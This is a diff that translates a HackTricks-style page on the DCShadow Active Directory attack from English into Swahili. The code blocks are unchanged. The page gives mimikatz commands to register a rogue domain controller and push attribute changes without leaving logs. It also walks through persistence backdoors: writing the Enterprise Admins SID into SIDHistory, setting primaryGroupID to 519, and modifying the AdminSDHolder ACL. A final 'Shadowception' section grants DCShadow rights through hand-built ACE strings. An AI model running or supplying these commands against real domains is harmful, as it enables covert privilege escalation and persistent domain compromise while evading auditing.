@@ -2,11 +2,10 @@
 
 # DCShadow
 
-It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
-Note that if you use wrong data, pretty ugly logs will appear.
+Inajisajili **Domain Controller** mpya katika AD na kuitumia **kushinikiza sifa** (SIDHistory, SPNs...) kwenye vitu vilivyotajwa **bila** kuacha **maandishi** yoyote kuhusu **mabadiliko**. Unahitaji ruhusa za DA na uwe ndani ya **domain ya mzizi**.\
+Kumbuka kwamba ikiwa utatumia data mbaya, maandiko mabaya yatatokea.
 
-To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
-
+Ili kutekeleza shambulio unahitaji mifano 2 ya mimikatz. Moja yao itaanzisha seva za RPC kwa ruhusa za SYSTEM (lazima uonyeshe hapa mabadiliko unayotaka kufanya), na mfano mwingine utatumika kushinikiza thamani:
 ```bash:mimikatz1 (RPC servers)
 !+
 !processtoken
@@ -16,28 +15,26 @@ lsadump::dcshadow /object:username /attribute:Description /value="My new descrip
 ```bash:mimikatz2 (push) - Needs DA or similar
 lsadump::dcshadow /push
 ```
+Kumbuka kwamba **`elevate::token`** haitafanya kazi katika `mimikatz1` session kwani hiyo iliongeza mamlaka ya thread, lakini tunahitaji kuongeza **mamlaka ya mchakato**.\
+Unaweza pia kuchagua na "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
-You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+Unaweza kusukuma mabadiliko kutoka kwa DA au kutoka kwa mtumiaji mwenye ruhusa hizi za chini:
 
-You can push the changes from a DA or from a user with this minimal permissions:
+- Katika **object ya domain**:
+- _DS-Install-Replica_ (Ongeza/ondoa Replica katika Domain)
+- _DS-Replication-Manage-Topology_ (Simamisha Topolojia ya Replika)
+- _DS-Replication-Synchronize_ (Sawaisha Replika)
+- **Object za Sites** (na watoto wake) katika **Configuration container**:
+- _CreateChild and DeleteChild_
+- Object ya **kompyuta ambayo imeandikishwa kama DC**:
+- _WriteProperty_ (Sio Andika)
+- **Object ya lengo**:
+- _WriteProperty_ (Sio Andika)
 
-- In the **domain object**:
-  - _DS-Install-Replica_ (Add/Remove Replica in Domain)
-  - _DS-Replication-Manage-Topology_ (Manage Replication Topology)
-  - _DS-Replication-Synchronize_ (Replication Synchornization)
-- The **Sites object** (and its children) in the **Configuration container**:
-  - _CreateChild and DeleteChild_
-- The object of the **computer which is registered as a DC**:
-  - _WriteProperty_ (Not Write)
-- The **target object**:
-  - _WriteProperty_ (Not Write)
+Unaweza kutumia [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kutoa ruhusa hizi kwa mtumiaji asiye na mamlaka (kumbuka kwamba hii itacha baadhi ya kumbukumbu). Hii ni ya kikomo zaidi kuliko kuwa na mamlaka ya DA.\
+Kwa mfano: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Hii inamaanisha kwamba jina la mtumiaji _**student1**_ anapokuwa kwenye mashine _**mcorp-student1**_ ana ruhusa za DCShadow juu ya object _**root1user**_.
 
-You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
-For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.
-
-## Using DCShadow to create backdoors
-
+## Kutumia DCShadow kuunda backdoors
 ```bash:Set Enterprise Admins in SIDHistory to a user
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
@@ -52,24 +49,22 @@ lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 #Second, add to the ACE permissions to your user and push it using DCShadow
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
+## Shadowception - Toa DCShadow ruhusa kwa kutumia DCShadow (hakuna kumbukumbu za ruhusa zilizobadilishwa)
 
-## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)
+Tunahitaji kuongeza ACEs zifuatazo na SID ya mtumiaji wetu mwishoni:
 
-We need to append following ACEs with our user's SID at the end:
+- Kwenye kituo cha kikoa:
+- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
+- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+- Kwenye kituo cha kompyuta ya mshambuliaji: `(A;;WP;;;UserSID)`
+- Kwenye kituo cha mtumiaji wa lengo: `(A;;WP;;;UserSID)`
+- Kwenye kituo cha Tovuti katika kontena ya Mipangilio: `(A;CI;CCDC;;;UserSID)`
 
-- On the domain object:
-  - `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-  - `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
-  - `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-- On the attacker computer object: `(A;;WP;;;UserSID)`
-- On the target user object: `(A;;WP;;;UserSID)`
-- On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`
+Ili kupata ACE ya sasa ya kitu: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
 
-To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+Kumbuka kwamba katika kesi hii unahitaji kufanya **mabadiliko kadhaa,** si moja tu. Hivyo, katika **mimikatz1 session** (RPC server) tumia parameter **`/stack` na kila mabadiliko** unayotaka kufanya. Kwa njia hii, utahitaji tu **`/push`** mara moja ili kutekeleza mabadiliko yote yaliyokamatwa kwenye seva ya rogue.
 
-Notice that in this case you need to make **several changes,** not just one. So, in the **mimikatz1 session** (RPC server) use the parameter **`/stack` with each change** you want to make. This way, you will only need to **`/push`** one time to perform all the stucked changes in the rouge server.
-
-[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**Taarifa zaidi kuhusu DCShadow katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 {{#include ../../banners/hacktricks-training.md}}
-
